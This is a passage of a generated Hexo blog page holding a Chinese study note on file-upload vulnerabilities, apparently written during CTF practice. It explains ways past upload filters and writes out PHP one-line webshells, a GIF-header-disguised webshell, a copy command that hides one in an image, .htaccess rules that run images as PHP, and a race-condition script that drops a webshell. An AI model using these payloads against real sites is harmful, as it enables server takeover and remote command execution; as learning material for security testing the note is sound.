@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+
+
+  <meta name="generator" content="Hexo 6.3.0">
+
+  
+
+  
+
+  
+    <meta name="author" content="John Doe">
+  
+
+  
+
+  
+
+  <title>Hexo</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  
+
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(https://qiniu.sukoshi.xyz/src/images/68686407_p0.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          Hexo
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/">首页</a></li>
+        
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
+        
+          <li class="navbar-list-item"><a href="/about">关于</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap"></h1>
+          <h2 class="title-sub-wrap">
+            <strong>John Doe</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2023-06-19T10:38:06.345Z" itemprop="datePublished">2023-06-19</time>
+          </h2>
+          
+            <h2 class="title-sub-wrap new-date">
+              <span>最后更新于</span>
+              <time  class="article-updated" datetime="2023-06-13T12:57:38.580Z" itemprop="dateUpdated">2023-06-13</time>
+            </h2>
+          
+          
+          <ul class="wrap-list dark">
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h1 id="文件上传笔记"><a href="#文件上传笔记" class="headerlink" title="文件上传笔记"></a>文件上传笔记</h1><p>文件上传漏洞常触发点：相册、头像上传、视频、照片分享、附件上传（论坛发帖、邮箱）、文件管理器等。</p>
+<p>漏洞形成条件：</p>
+<ul>
+<li>文件能够通过前端和后端过滤和文件处理</li>
+<li>文件内容不会改变，能够被正确存储</li>
+<li>存储位置在Web容器控制范围内</li>
+<li>攻击者有权限访问存储目录并有权执行文件</li>
+<li>只要破坏了其中的任一条件即可防止文件上传漏洞。</li>
+</ul>
+<p>一句话木马：<?php @eval($_POST['attack']);?></p>
+<h2 id="1-前端验证"><a href="#1-前端验证" class="headerlink" title="1.前端验证"></a>1.前端验证</h2><p>应用程序是通过前端js代码进行验证，而不再后端程序进行验证，所以我们可以通过burpsuite抓包进行前端验证修改，步骤如下：</p>
+<p><img src="F:\网络安全\图片资料\前端js饶过.png"></p>
+<p>然后通过剑蚁程序进行文件操作便可成功获得数据。</p>
+<h2 id="2-文件名滤过绕过"><a href="#2-文件名滤过绕过" class="headerlink" title="2.文件名滤过绕过"></a>2.文件名滤过绕过</h2><p>原理：js代码通过黑名单的形式判断文件上传类型，并没有完整的过滤功能，攻击者通过上传黑名单以外的文件类型而进行文件验证。</p>
+<p>此种过滤方式通常较为单一，将文件后缀改为PHP，php2，phP等便可以成功绕过。具体如下图：</p>
+<p><img src="F:\网络安全\图片资料\文件名绕过.png"></p>
+<h2 id="3-Content—Type过滤绕过"><a href="#3-Content—Type过滤绕过" class="headerlink" title="3.Content—Type过滤绕过"></a>3.Content—Type过滤绕过</h2><p>不同文件都会有不同的Content—Type，例如JPG文件的Content—Type是image&#x2F;jpeg，PHP文件文件的Content—Type为application&#x2F;xhtml+xml，以下是一些常见文件的Content—Type：</p>
+<ul>
+<li>文本文件 (.txt)：text&#x2F;plain</li>
+<li>HTML 文件 (.html)：text&#x2F;html</li>
+<li>CSS 文件 (.css)：text&#x2F;css</li>
+<li>JavaScript 文件 (.js)：application&#x2F;javascript</li>
+<li>JSON 文件 (.json)：application&#x2F;json</li>
+<li>图片文件 (.jpg, .png, .gif)：image&#x2F;jpeg, image&#x2F;png, image&#x2F;gif</li>
+<li>PDF 文件 (.pdf)：application&#x2F;pdf</li>
+<li>Word 文件 (.docx)：application&#x2F;vnd.openxmlformats-officedocument.wordprocessingml.document</li>
+<li>Excel 文件 (.xlsx)：application&#x2F;vnd.openxmlformats-officedocument.spreadsheetml.sheet</li>
+<li>PowerPoint 文件 (.pptx)：application&#x2F;vnd.openxmlformats-officedocument.presentationml.presentation</li>
+</ul>
+<p>此种过滤用的就是判断上传的文件是否为符合要求的文件，若不符合，他就不会上传到服务器，这个时候我们便可以利用bp抓包来修改上传文件的Content—Type，使其变为符合要求的请求头，达到绕过的目的。</p>
+<h2 id="4-文件头绕过"><a href="#4-文件头绕过" class="headerlink" title="4.文件头绕过"></a>4.文件头绕过</h2><p>与上一种过滤相同，不同的文件有不同的文件头，防护者通过对上传文件的文件头进行检测，若不是符合要求的文件头，则文件不会被上传，以下是部分常用文件的文件头：</p>
+<ul>
+<li>JPEG 图像文件 (.jpg, .jpeg): FF D8 FF</li>
+<li>PNG 图像文件 (.png): 89 50 4E 47 0D 0A 1A 0A</li>
+<li>GIF 图像文件 (.gif): 47 49 46 38 37 61 或 47 49 46 38 39 61</li>
+<li>BMP 图像文件 (.bmp): 42 4D</li>
+<li>PDF 文件 (.pdf): 25 50 44 46 2D 或 25 50 44 46 2D 31 2E</li>
+<li>Word 文件 (.doc, .docx): D0 CF 11 E0 A1 B1 1A E1 或 50 4B 03 04 14 00 06 00</li>
+<li>Excel 文件 (.xls, .xlsx): D0 CF 11 E0 A1 B1 1A E1 或 50 4B 03 04 14 00 06 00</li>
+<li>PowerPoint 文件 (.ppt, .pptx): D0 CF 11 E0 A1 B1 1A E1 或 50 4B 03 04 14 00 06 00</li>
+<li>MP3 音频文件 (.mp3): FF FB 或 FF F3 或 49 44 33</li>
+<li>MP4 视频文件 (.mp4): 00 00 00 18 或 00 00 00 20</li>
+<li>ZIP 压缩文件 (.zip): 50 4B 03 04</li>
+</ul>
+<p><strong>注意:上述文件头为十六进制，在写入木马文件时需要将其转化为ascii码。</strong></p>
+<p>这种时候，我们如果想要绕过，只需要修改文件的文件头即可完成绕过，修改文件头有以下几种方法：</p>
+<ol>
+<li><p>直接在木马文件中添加文件头：顾名思义，就是直接在写的木马文件的最前边加上符合要求的文件的文件头，如：GIF文件的文件头GIF89a，故我们只需在代码文件中写入如下内容即可：</p>
+<p><code>GIF89a&lt;?php eval($_POST[&#39;shell&#39;]); ?&gt;</code></p>
+<p>这段内容即可完成绕过；</p>
+</li>
+<li><p>文件结合法：除添加文件头之外，还有一种比较常用的方法，不需要记文件头。我们可以直接将木马文件复制到一个文本文件中生成一个新的木马文件，具体操作如下：假设111.jpg是一个文本文件，222.txt是一个木马文件，里边内容为一句话木马；通过copy命令将两个文件结合到333.php文件中，具体代码如下：</p>
+<p><code>copy 111.jpg/b + 222.txt/a 333.php</code></p>
+<p>上面的<code>/b</code>表示该文件为一个二进制文件，<code>/a</code>表示一个ASCII的文本文件。</p>
+</li>
+</ol>
+<p>在完成木马制作之后，直接上传成功后，用剑蚁连接即可。</p>
+<h2 id="5-htaccess文件上传"><a href="#5-htaccess文件上传" class="headerlink" title="5.  .htaccess文件上传"></a>5.  .htaccess文件上传</h2><h3 id="htaccess基础"><a href="#htaccess基础" class="headerlink" title="htaccess基础"></a>htaccess基础</h3><p>htaccess是一种用于 Apache Web 服务器的特殊配置文件。是纯文本文件，主要作用有URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止&#x2F;允许特定IP&#x2F;IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。简单来说，就是我们可以通过这个文件将上传的png、jpg等文件以php代码的方式来运行。</p>
+<ol>
+<li><p>命令使用条件：</p>
+<ul>
+<li><p>需开启配置文件httpd.conf：  </p>
+<p> <code>Options FollowSymLinks AllowOverride None</code></p>
+<p>中将None改为All。</p>
+</li>
+<li><p>去掉Mod_rewrite.so 的注释，开启rewrite模块</p>
+<p><code>LoadModule rewrite_module modules/mod_rewrite.so</code></p>
+</li>
+</ul>
+</li>
+<li><p>htaccess文件上传配置</p>
+<ul>
+<li><p>命令构建方法：</p>
+<p><code>FilesMatch</code>指令：</p>
+<pre class="line-numbers language-htaccess" data-language="htaccess"><code class="language-htaccess">&lt;FilesMatch &quot;\.上传的问价的类型&quot;&gt;  
+   SetHandler application&#x2F;x-httpd-php
+&lt;&#x2F;FilesMatch&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><code>AddType</code>指令：</p>
+<pre class="line-numbers language-htaccess" data-language="htaccess"><code class="language-htaccess">AddType application&#x2F;x-httpd-php .文件扩展名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>相比FilesMatch指令来说的话，AddType更加便利，他可以添加多种文件，无需指定文件名。</p>
+</li>
+</ul>
+</li>
+</ol>
+<p>注意：有的时候他会对你上传的图片进行文件头检查，注意多种组合结合使用。</p>
+<p>在上传之后直接用剑蚁进行问价查询，或者远程命令执行即可。</p>
+<h2 id="6-文件截断上传"><a href="#6-文件截断上传" class="headerlink" title="6.文件截断上传"></a>6.文件截断上传</h2><ol>
+<li><p>原理：</p>
+<p>操作系统通常由c语言或汇编语言写成，在这两种语言当中，<code>\0</code>通常用作字符串结尾，故我们在上传文件时，可以修改上传的数据包，在文件名中插入<code>\0</code>,使在操作系统中的文件为我们想要的文件文件类型。</p>
+</li>
+<li><p>使用前提：</p>
+<ul>
+<li>php版本小于5.3.29</li>
+<li>magic_quotes_gpc &#x3D; Off</li>
+</ul>
+</li>
+<li><p>具体方法：</p>
+<p>在上传文件之后，抓包，得到上传的文件的数据包：</p>
+<p><img src="F:\网络安全\图片资料\文件上传00截断截图1.png"></p>
+<p>然后在文件名处，和filename处进行00截断，注意，截断用的是<code>%00</code>，而非是<code>\0</code>。如下图所示：</p>
+<p><img src="F:\网络安全\图片资料\文件上传00截断截图2.png"></p>
+<p>在上传完图片之后便可以，用蚁剑进行连结。</p>
+<p>以上为get形式传参，若改为post传参，文件路径会在下边。会在Centent—Type的上下方，此时我们依旧需要截断，但无法使用%00，因为post传参不会解码，故我们需要先解码，再截断，或者在hex界面将文件路径的最后改为00即可。</p>
+</li>
+</ol>
+<h2 id="7-二次渲染文件上传"><a href="#7-二次渲染文件上传" class="headerlink" title="7.二次渲染文件上传"></a>7.二次渲染文件上传</h2><ol>
+<li><p>原理：在我们上传文件后，网站会对图片进行二次处理（格式、尺寸，保存，删除 要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片（标准化）并放到网站对应的标签进行显示。</p>
+</li>
+<li><p>绕过方法：</p>
+<ul>
+<li>配合竞争条件文件上传：击者可以利用条件竞争漏洞在服务器上同时上传多个图片，并在处理第一个上传的图片时修改其属性，使其包含恶意代码。恶意代码将在进行二次渲染时被激活，从而导致系统的安全被破坏。</li>
+<li>配合文件包含漏洞：就是将木马插入图片当中，使其可以被执行。</li>
+</ul>
+</li>
+<li><p>如何判断图片是否被二次处理，处理之后有什么地方是相同的：</p>
+<p>在我们用copy命令制作好一个图片木马之后，上传到服务器之后会展示出来，我们便可以通过图片十六进制查看文件来对比有什么差别。如：</p>
+<p><img src="F:\网络安全\图片资料\二次渲染.png"></p>
+<p>再进行比较，便可以知道我们原本的muma.png文件在哪些地方变化了，哪些地方没有变化，在没有变化的地方将我们的木马复制过去，便可以保证在被二次渲染时不会被过滤，从而达到绕过的目的。</p>
+</li>
+</ol>
+<h2 id="8-竞争条件文件上传"><a href="#8-竞争条件文件上传" class="headerlink" title="8.竞争条件文件上传"></a>8.竞争条件文件上传</h2><p>该漏洞值多线程在没有进行锁操作的情况下或同步同时进行访问同一个共享代码、变量文件，运行的额结果以来不用线程访问数据的顺序。引用别人的列子：</p>
+<p><em>假设两个进程P1和P2共享了变量a。在某一执行时刻，P1更新a为1，在另一时刻，P2更新a为2。因此两个任务竞争地写变量a。在这个例子中，竞争的“失败者”(最后更新的进程）决定了变量a的最终值。多个进程并发访问和操作同一数据且执行结果与访问的特定顺序有关，称为竞争条件。</em></p>
+<ul>
+<li><p>成因：由于服务器端在处理不同用户的请求时是并发进行处理的，如果对这些并发操作处理不当的话会由于一些时序问题导致一些异常情况的发生；简单来说就是我们上传的代码时在上传之后再进行检测是否包含可疑代码，也就是说，我们的php代码被上传之后，后端会在短时件内把他删除，所以只要我们抢在其删除钱访问代码，便可以成功入侵。或者在其成功进入后端时使其在当前目录下生成一个木马文件也可行。</p>
+</li>
+<li><p>利用方法：在上传木马时，将木马文件写为:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"muma.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$string</span><span class="token operator">=</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST["test"]); ?>'</span><span class="token punctuation">;</span>
+	<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">fcolse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>将我们的木马文件写在当前文件路径当中的muma.php文件当中，然后我们直接访问muma.php文件即可。或者说我们利用bp当中的模块，进行多次数据发送，在发送的途中进行蚁剑连结，成功之后即可。</p>
+</li>
+</ul>
+<h2 id="9-双写后缀绕过"><a href="#9-双写后缀绕过" class="headerlink" title="9.双写后缀绕过"></a>9.双写后缀绕过</h2><p>在部分过滤当中，他会将我们上传文件名中不和法的扩展名替换为空格，通常为替换php，但是只会替换一次，在这种时候我们便可以通过此种方法来进行绕过。即将后缀写为<code>pphphp</code>，在将第一个php替换为空格时，第二个空格也会因此出现。便可以成功绕过。</p>
+<h2 id="10-做题疑点记录"><a href="#10-做题疑点记录" class="headerlink" title="10.做题疑点记录"></a>10.做题疑点记录</h2><ol>
+<li><p>23&#x2F;6&#x2F;13：在写nssctf中的Ez_upload题目时，遇到了没法解决的现象，在上传一个gif图片之后显示：</p>
+<p><img src="F:\网络安全\图片资料\做题疑点记录1.png"></p>
+<p>期初我以为是我上传的图片类型不合适，于是又尝试了其他两种图片类型，结果都是显示这个状态；于是我又以为文件上传的路径会在返回包里，我又拿bp抓包查看，但在抓包之后依旧未查看到文件路径：</p>
+<p><img src="F:\网络安全\图片资料\做题记录2.png"></p>
+<p>于是找了题解，题解解释说需将Centent—Cype改成image&#x2F;jpeg，并解释其必须按为此种类型图片才可上传，在尝试过后，果然可行，于是收集了如下常见图片类型的文件头：</p>
+<ul>
+<li>JPEG（jpg&#x2F;jpeg）：Content-Type 为 image&#x2F;jpeg。</li>
+<li>PNG（png）：Content-Type 为 image&#x2F;png。</li>
+<li>GIF（gif）：Content-Type 为 image&#x2F;gif。</li>
+<li>BMP（bmp）：Content-Type 为 image&#x2F;bmp 或者 image&#x2F;x-windows-bmp。</li>
+<li>TIFF（tif&#x2F;tiff）：Content-Type 为 image&#x2F;tiff 或者 image&#x2F;x-tiff。</li>
+<li>WebP（webp）：Content-Type 为 image&#x2F;webp。</li>
+</ul>
+<p>便于在之后的写题中测试。</p>
+</li>
+</ol>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2023/06/19/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88XSS%EF%BC%89%E6%94%BB%E5%87%BB/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">(no title)</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="https://s.gravatar.com/avatar/2d6b803eea37de0257620d5fabee7e64?s=200&amp;r=g&amp;d=retro" class="soft-size--round soft-style--box" alt="Creeper">
+    
+    
+      <h2>Creeper</h2>
+    
+    
+      <p>贵在坚持</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>4</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        0
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        0
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>flex-block主题部分重构，详情查看https://github.com/miiiku/flex-block</p>
+  </div>
+</section>
+
+
+      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+    <span>CATEGORYS</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categorys-list">
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/621779/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+          <a href="https://twitter.com/guanquanhong" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-twitter" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M962.285714 233.142857q-38.285714 56-92.571429 95.428571 0.571429 8 0.571429 24 0 74.285714-21.714286 148.285714t-66 142-105.428571 120.285714-147.428571 83.428571-184.571429 31.142857q-154.857143 0-283.428571-82.857143 20 2.285714 44.571429 2.285714 128.571429 0 229.142857-78.857143-60-1.142857-107.428571-36.857143t-65.142857-91.142857q18.857143 2.857143 34.857143 2.857143 24.571429 0 48.571429-6.285714-64-13.142857-106-63.714286t-42-117.428571l0-2.285714q38.857143 21.714286 83.428571 23.428571-37.714286-25.142857-60-65.714286t-22.285714-88q0-50.285714 25.142857-93.142857 69.142857 85.142857 168.285714 136.285714t212.285714 56.857143q-4.571429-21.714286-4.571429-42.285714 0-76.571429 54-130.571429t130.571429-54q80 0 134.857143 58.285714 62.285714-12 117.142857-44.571429-21.142857 65.714286-81.142857 101.714286 53.142857-5.714286 106.285714-28.571429z"></path>
+</svg>
+          </a>
+        
+      
+    </div>
+     
+    <p>&copy; 2023 <a href="/" target="_blank">John Doe</a></p>
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
